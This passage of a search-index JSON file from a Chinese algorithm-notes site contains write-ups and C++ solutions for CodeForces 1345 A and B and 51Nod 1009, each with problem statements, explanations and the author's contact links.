\u521d\u59cb\u5316 memset(list, 0, sizeof(list)); // \u8ba1\u7b97 claculate(NUM - 1); // test case for (int i = 0; i < t; i++) { ans = 0; // \u5361\u7247\u6570\u91cf scanf(\"%d\", &m); buffer = m; if (mp.find(m) == mp.end()) { // \u67e5\u627e while (buffer >= 2) { buffer -= list[binary_search(list, 0, (NUM - 1), buffer)]; ans++; } // \u5b58\u50a8\u7ed3\u679c mp[m] = ans; } else { ans = mp[m]; } // \u8f93\u51fa printf(\"%d\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.CodeForces 1345 B Card Constructions"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#codeforces-1345-b-card-constructions","text":"","title":"CodeForces 1345 B Card Constructions"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#_1","text":"CodeForces 1345 B Card Constructions \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 256 MB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#12-problem-description","text":"A card pyramid of height 1 is constructed by resting two cards against each other. For (h >1) , a card pyramid of height h is constructed by placing a card pyramid of height h - 1 onto a base.A base consists of h pyramids of height 1 , and h - 1 cards on top. For example, card pyramids of heights 1 , 2 , and 3 look as follows: You start with n cards and build the tallest pyramid that you can. If there are some cards remaining, you build the tallest pyramid possible with the remaining cards. You repeat this process until it is impossible to build another pyramid. In the end, how many pyramids will you have constructed?","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#13-input","text":"Each test consists of multiple test cases. The first line contains a single integer t( \\le t \\le 1000) \u2014 the number of test cases. Next t lines contain descriptions of test cases. Each test case contains a single integer n(1 \\le n \\le 10^9) \u2014 the number of cards. It is guaranteed that the sum of n over all test cases does not exceed 10^9 .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#14-output","text":"For each test case output a single integer \u2014 the number of pyramids you will have constructed in the end.","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#15-sample-input","text":"5 3 14 15 24 1","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#16-sample-output","text":"1 2 1 3 0","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#17-note","text":"In the first test, you construct a pyramid of height 1 with 2 cards. There is 1 card remaining, which is not enough to build a pyramid. In the second test, you build two pyramids, each of height 2, with no cards remaining. In the third test, you build one pyramid of height 3, with no cards remaining. In the fourth test, you build one pyramid of height 3 with 9 cards remaining. Then you build a pyramid of height 2 with 2 cards remaining. Then you build a final pyramid of height 1 with no cards remaining. In the fifth test, one card is not enough to build any pyramids.","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#18-source","text":"CodeForces 1345 B Card Constructions","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#2","text":"\u901a\u8fc7\u9012\u63a8\u65b9\u7a0b f(x) = f(x-1) + 3x - 1 \u63a8\u5bfc\u6784\u5efa x \u5c42\u91d1\u5b57\u5854\u9700\u8981\u591a\u5c11\u5f20\u5361\u724c\u3002\u8ba1\u7b97\u51fa\u6765\u4ee5\u540e\u5b58\u50a8\u5728 list \u4e2d\uff0c 10^9 \u5185\u6700\u591a 25820 \u5c42\u5361\u724c\u91d1\u5b57\u5854\uff0c\u8ba1\u7b97\u5230\u8fd9\u91cc\u5373\u53ef\u3002 \u7136\u540e\u5bf9\u6bcf\u4e2a\u8f93\u5165 m \uff0c\u5bf9 list \u8fdb\u884c\u5faa\u73af\u4e8c\u5206\u67e5\u627e\uff0c\u627e\u5230 list[x] \\le m < list[x+1] \uff0c\u7136\u540e m = m - list[x] \uff0c\u76f4\u5230 m<2 \uff0c\u4e0d\u518d\u80fd\u642d\u5efa\u91d1\u5b57\u5854\u3002\u8f93\u51fa\u5faa\u73af\u4e8c\u5206\u67e5\u627e\u7684\u6b21\u6570 ans \uff0c\u5373\u6700\u591a\u80fd\u642d\u5efa\u591a\u5c11\u91d1\u5b57\u5854\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/#3","text":"#include <iostream> #include <map> #include <math.h> #include <string.h> using namespace std; // 10^9 \u5185\u6700\u591a 25820 \u5c42\u5361\u724c\u91d1\u5b57\u5854 const int NUM = 25821; // \u5b58\u50a8 int list[NUM]; // \u5b58\u50a8\u7ed3\u679c int ans; // \u5b58\u50a8 map<int, int> mp; // \u8ba1\u7b97 void claculate(int m) { list[1] = 2; for (int i = 2; i <= m; i++) { // \u9012\u63a8\u65b9\u7a0b list[i] = list[i - 1] + 3 * i - 1; } } // \u4e8c\u5206\u67e5\u627e int binary_search(int array[], int low, int high, int target) { while (low <= high) { int mid = low + (high - low) / 2; if (array[mid] <= target && array[mid + 1] > target) { return mid; } else if (array[mid] > target) { high = mid - 1; } else if (array[mid] < target) { low = mid + 1; } } return -1; } int main() { // test case int t; scanf(\"%d\", &t); // \u5361\u7247\u6570\u91cf int m, buffer; // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); // \u8ba1\u7b97 claculate(NUM - 1); // test case for (int i = 0; i < t; i++) { ans = 0; // \u5361\u7247\u6570\u91cf scanf(\"%d\", &m); buffer = m; if (mp.find(m) == mp.end()) { // \u67e5\u627e while (buffer >= 2) { buffer -= list[binary_search(list, 0, (NUM - 1), buffer)]; ans++; } // \u5b58\u50a8\u7ed3\u679c mp[m] = ans; } else { ans = mp[m]; } // \u8f93\u51fa printf(\"%d\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/","text":"CodeForces 1345 A Puzzle Pieces # \u76ee\u5f55 # CodeForces 1345 A Puzzle Pieces \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 256 MB 1.2. Problem Description # You are given a special jigsaw puzzle consisting of n \\cdot m identical pieces. Every piece has three tabs and one blank, as pictured below. The jigsaw puzzle is considered solved if the following conditions hold: The pieces are arranged into a grid with n rows and m columns. For any two pieces that share an edge in the grid, a tab of one piece fits perfectly into a blank of the other piece. Through rotation and translation of the pieces, determine if it is possible to solve the jigsaw puzzle. 1.3. Input # The test consists of multiple test cases. The first line contains a single integer t( \\le t \\le 1000) \u2014 the number of test cases. Next t lines contain descriptions of test cases. Each test case contains two integers n and m (1 \\le n, m \\le 1000) . 1.4. Output # For each test case output a single line containing \"YES\" if it is possible to solve the jigsaw puzzle, or \"NO\" otherwise. You can print each letter in any case (upper or lower). 1.5. Sample Input # 3 1 3 100000 100000 2 2 1.6. Sample Output # YES NO YES 1.7. Note # For the first test case, this is an example solution: For the second test case, we can show that no solution exists. For the third test case, this is an example solution: 1.8. Source # CodeForces 1345 A Puzzle Pieces 2. \u89e3\u8bfb # \u8981\u5c06 n \\cdot m \u4e2a\u62fc\u56fe\u7ec4\u5408\u8d77\u6765\uff0c\u5f62\u6210 m \u884c n \u5217\u7684\u56fe\u5f62\uff0c\u5219\u4f1a\u6709 m \\times (n - 1) + n \\times (m - 1) \u4e2a\u8fde\u63a5\u5904\uff0c\u6bcf\u4e2a\u8fde\u63a5\u5904\u9700\u8981\u4e00\u4e2a\u51f8\u8d77\u548c\u4e00\u4e2a\u51f9\u9677\u7684\u63a5\u53e3\u3002\u7531\u4e8e\u6bcf\u4e2a\u62fc\u56fe\u53ea\u6709\u4e00\u4e2a\u51f9\u9677\uff0c\u90a3\u4e48\u8981\u6210\u529f\u5c06\u62fc\u56fe\u8fdb\u884c\u62fc\u63a5\uff0c\u5219\u9700\u8981 n \\times m \\ge m \\times (n - 1) + n \\times (m - 1) \u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; int main() { // test case int t; scanf(\"%d\", &t); // \u884c\u5217\u6570\u5217 long long line, row; // \u8fde\u63a5\u5904\u6570\u91cf long long edges; // test case for (int i = 0; i < t; i++) { // \u884c\u5217\u6570\u91cf scanf(\"%lld %lld\", &line, &row); // \u8ba1\u7b97\u8fde\u63a5\u5904 edges = (line) * (row - 1) + row * (line - 1); // \u8f93\u51fa printf(\"%s\\n\", edges <= (line * row) ? \"YES\" : \"NO\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.CodeForces 1345 A Puzzle Pieces"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#codeforces-1345-a-puzzle-pieces","text":"","title":"CodeForces 1345 A Puzzle Pieces"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#_1","text":"CodeForces 1345 A Puzzle Pieces \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 256 MB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#12-problem-description","text":"You are given a special jigsaw puzzle consisting of n \\cdot m identical pieces. Every piece has three tabs and one blank, as pictured below. The jigsaw puzzle is considered solved if the following conditions hold: The pieces are arranged into a grid with n rows and m columns. For any two pieces that share an edge in the grid, a tab of one piece fits perfectly into a blank of the other piece. Through rotation and translation of the pieces, determine if it is possible to solve the jigsaw puzzle.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#13-input","text":"The test consists of multiple test cases. The first line contains a single integer t( \\le t \\le 1000) \u2014 the number of test cases. Next t lines contain descriptions of test cases. Each test case contains two integers n and m (1 \\le n, m \\le 1000) .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#14-output","text":"For each test case output a single line containing \"YES\" if it is possible to solve the jigsaw puzzle, or \"NO\" otherwise. You can print each letter in any case (upper or lower).","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#15-sample-input","text":"3 1 3 100000 100000 2 2","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#16-sample-output","text":"YES NO YES","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#17-note","text":"For the first test case, this is an example solution: For the second test case, we can show that no solution exists. For the third test case, this is an example solution:","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#18-source","text":"CodeForces 1345 A Puzzle Pieces","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#2","text":"\u8981\u5c06 n \\cdot m \u4e2a\u62fc\u56fe\u7ec4\u5408\u8d77\u6765\uff0c\u5f62\u6210 m \u884c n \u5217\u7684\u56fe\u5f62\uff0c\u5219\u4f1a\u6709 m \\times (n - 1) + n \\times (m - 1) \u4e2a\u8fde\u63a5\u5904\uff0c\u6bcf\u4e2a\u8fde\u63a5\u5904\u9700\u8981\u4e00\u4e2a\u51f8\u8d77\u548c\u4e00\u4e2a\u51f9\u9677\u7684\u63a5\u53e3\u3002\u7531\u4e8e\u6bcf\u4e2a\u62fc\u56fe\u53ea\u6709\u4e00\u4e2a\u51f9\u9677\uff0c\u90a3\u4e48\u8981\u6210\u529f\u5c06\u62fc\u56fe\u8fdb\u884c\u62fc\u63a5\uff0c\u5219\u9700\u8981 n \\times m \\ge m \\times (n - 1) + n \\times (m - 1) \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%87%A0%E4%BD%95/1.CodeForces_1345_A_Puzzle_Pieces/#3","text":"#include <iostream> using namespace std; int main() { // test case int t; scanf(\"%d\", &t); // \u884c\u5217\u6570\u5217 long long line, row; // \u8fde\u63a5\u5904\u6570\u91cf long long edges; // test case for (int i = 0; i < t; i++) { // \u884c\u5217\u6570\u91cf scanf(\"%lld %lld\", &line, &row); // \u8ba1\u7b97\u8fde\u63a5\u5904 edges = (line) * (row - 1) + row * (line - 1); // \u8f93\u51fa printf(\"%s\\n\", edges <= (line * row) ? \"YES\" : \"NO\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/","text":"51Nod 1009 \u6570\u5b571\u7684\u6570\u91cf # \u76ee\u5f55 # 51Nod 1009 \u6570\u5b571\u7684\u6570\u91cf \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u5b9a\u4e00\u4e2a\u5341\u8fdb\u5236\u6b63\u6574\u6570 N \uff0c\u5199\u4e0b\u4ece1\u5f00\u59cb\uff0c\u5230 N \u7684\u6240\u6709\u6b63\u6570\uff0c\u8ba1\u7b97\u51fa\u5176\u4e2d\u51fa\u73b0\u6240\u67091\u7684\u4e2a\u6570\u3002 \u4f8b\u5982\uff1a n = 12 \uff0c\u5305\u542b\u4e865\u4e2a1\u30021,10,12\u5171\u5305\u542b3\u4e2a1\uff0c11\u5305\u542b2\u4e2a1\uff0c\u603b\u51715\u4e2a1\u3002 1.3. Input # \u8f93\u5165 N(1 \\le N \\le 10^9) 1.4. Output # \u8f93\u51fa\u5305\u542b1\u7684\u4e2a\u6570 1.5. Sample Input # 12 1.6. Sample Output # 5 1.7. Source # 51Nod 1009 \u6570\u5b571\u7684\u6570\u91cf 2. \u89e3\u8bfb # \u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\uff0c\u4f9d\u6b21\u8003\u8651\u6bcf\u4e00\u6570\u4f4d\u4e3a1\u65f6\uff0c\u5176\u4ed6\u7684\u6570\u4f4d\u80fd\u591f\u53d6\u591a\u5c11\u79cd\u60c5\u51b5\u3002 \u5b9a\u4e49\u4ee5\u4e0b\u7b26\u53f7\uff1a pos : \u6570\u4f4d posNum : \u6570\u4f4d\u4e0a\u7684\u6570\u5b57 posScale : \u5f53\u524d\u6570\u4f4d\u4ee3\u8868\u7684\u6570\u91cf\u7ea7\uff0c posScale = 10^{pos} left : \u5de6\u8fb9\u7684\u6570\u4f4d right : \u53f3\u8fb9\u7684\u6570\u4f4d current : \u5f53\u524d\u8ba1\u6570 ans : \u7d2f\u8ba1\u8ba1\u6570 \u5224\u65ad\u6709\u591a\u5c11\u79cd\u60c5\u51b5\u7684\u65b9\u6cd5\u5982\u4e0b\uff1a \u82e5\u5f53\u524d\u6570\u4f4d\u5927\u4e8e1\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 \u5de6\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, left] \u5171 (left + 1) \u79cd\u60c5\u51b5 \u53f3\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, 10^{pos} - 1] \u5171 posScale \u79cd\u60c5\u51b5 \u5f53\u524d\u7684\u60c5\u51b5\u8ba1\u6570\u4e3a (left + 1) \\times posScale \u82e5\u5f53\u524d\u6570\u4f4d\u7b49\u4e8e0\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 \u5de6\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, left) \u5171 left \u79cd\u60c5\u51b5 \u53f3\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0c\u5171 posScale \u79cd\u60c5\u51b5 \u5f53\u524d\u7684\u60c5\u51b5\u8ba1\u6570\u4e3a left \\times posScale \u82e5\u5f53\u524d\u6570\u4f4d\u7b49\u4e8e1\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 \u5de6\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0c\u5171 left \u79cd\u60c5\u51b5 \u53f3\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0c\u5171 posScale \u79cd\u60c5\u51b5 \u8fd8\u8981\u52a0\u4e0a\u5de6\u8fb9\u6570\u4f4d\u53d6 left \uff0c\u5f53\u524d\u6570\u4f4d\u53d61\uff0c\u53f3\u8fb9\u7684\u6570\u4f4d\u53d6 [0, right] \u7684\u60c5\u51b5 \u5982\u8ba1\u7b97123\u65f6\uff0c\u8981\u8003\u8651 [100, 123] \u8fd9\u91cc\u768424\u79cd\u60c5\u51b5 \u5f53\u524d\u7684\u60c5\u51b5\u8ba1\u6570\u4e3a left \\times posScale + right + 1 \u4ee5 N = 123 \u4e3a\u4f8b pos posNum posScale left right current ans 0 3 1 12 0 13 13 1 2 10 1 3 20 33 2 1 100 0 23 24 57 \u5f97\u5230\u7684\u7b54\u6848\u4e3a57 3. \u4ee3\u7801 # #include <iostream> using namespace std; int Cal(int n) { // \u5b58\u50a8\u8ba1\u6570 int ans = 0; // \u53d6\u6570\u4f4d\uff0c\u4ece\u4e2a\u4f4d\u5f00\u59cb\u53d6\u5230\u6700\u9ad8\u4f4d int pos = 0; // \u5f53\u524d\u6570\u4f4d\u4ee3\u8868\u7684\u6570\u91cf\u7ea7\uff0cposScale = 10^pos int posScale = 1; int posNum = 0, left = 0, right = 0; while (n / posScale) { // posNum\uff0c\u5f53\u524d\u6570\u4f4d\u7684\u6570\u5b57 posNum = (n / posScale) % 10; // \u5f53\u524d\u6570\u4f4d\u5de6\u8fb9\u6240\u6709\u6570\u4f4d\u4e0a\u7684\u6570\u5b57 left = n / (posScale * 10); // \u5f53\u524d\u6570\u4f4d\u53f3\u8fb9\u6240\u6709\u6570\u4f4d\u4e0a\u7684\u6570\u5b57 right = n % posScale; // \u5224\u65ad\u5f53\u524d\u6570\u4f4d\u4e0a\u7684\u503c if (posNum > 1) { // \u82e5\u5927\u4e8e1\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 // \u5de6\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, left] \u5171 (left + 1) \u79cd\u60c5\u51b5 // \u53f3\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, 10^pos - 1] \u5171 posScale \u79cd\u60c5\u51b5 ans += (left + 1) * posScale; } else if (posNum == 0) { // \u82e5\u7b49\u4e8e0\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 // \u5de6\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, left) \u5171 (left) \u79cd\u60c5\u51b5 // \u53f3\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0cposScale \u79cd\u60c5\u51b5 ans += left * posScale; } else if (posNum == 1) { // \u82e5\u7b49\u4e8e1\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 // \u5de6\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0cleft\u79cd\u60c5\u51b5 // \u53f3\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0cposScale \u79cd\u60c5\u51b5 // \u8fd8\u8981\u52a0\u4e0a\u5de6\u8fb9\u6570\u4f4d\u53d6left\uff0c\u5f53\u524d\u6570\u4f4d\u53d61\uff0c\u53f3\u8fb9\u7684\u6570\u4f4d\u53d6[0, right]\u7684\u60c5\u51b5 // \u5982\u8ba1\u7b97123\u65f6\uff0c\u8981\u8003\u8651[100, 123]\u8fd9\u91cc\u768424\u79cd\u60c5\u51b5 ans += left * posScale + right + 1; } // \u53d6\u4e0b\u4e00\u4e2a\u6570\u4f4d pos++; posScale *= 10; } return ans; } int main() { int n; while (cin >> n) { cout << Cal(n) << endl; } return 0; } \u8fd8\u6709\u4e00\u79cd\u52a8\u6001\u89c4\u5212\u65b9\u6cd5\uff0c\u53c2\u8003\u81ea \u53e6\u4e00\u4f4d\u535a\u4e3b\u7684\u535a\u5ba2 #include<iostream> #include<cstring> #include<cstdio> using namespace std; typedef long long ll; const int maxn = 20; ll dp[maxn][maxn], a[maxn]; ll dfs(int pos, int num, int limit) { if(pos == -1) return num; if(!limit && dp[pos][num] != -1) return dp[pos][num]; int up = limit ? a[pos] : 9; ll tmp = 0; for(int i = 0; i <= up; i++) tmp += dfs(pos-1, num+(i==1), limit && i == a[pos]); if(!limit) dp[pos][num] = tmp; return tmp; } ll solve(ll x) { int pos = 0; while(x) { a[pos++] = x%10; x /= 10; } return dfs(pos-1, 0, 1); } int main(void) { ll n; memset(dp, -1, sizeof(dp)); while(cin >> n) printf(\"%lld\\n\", solve(n)); return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.51Nod 1009 \u6570\u5b571\u7684\u6570\u91cf"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#51nod-1009-1","text":"","title":"51Nod 1009 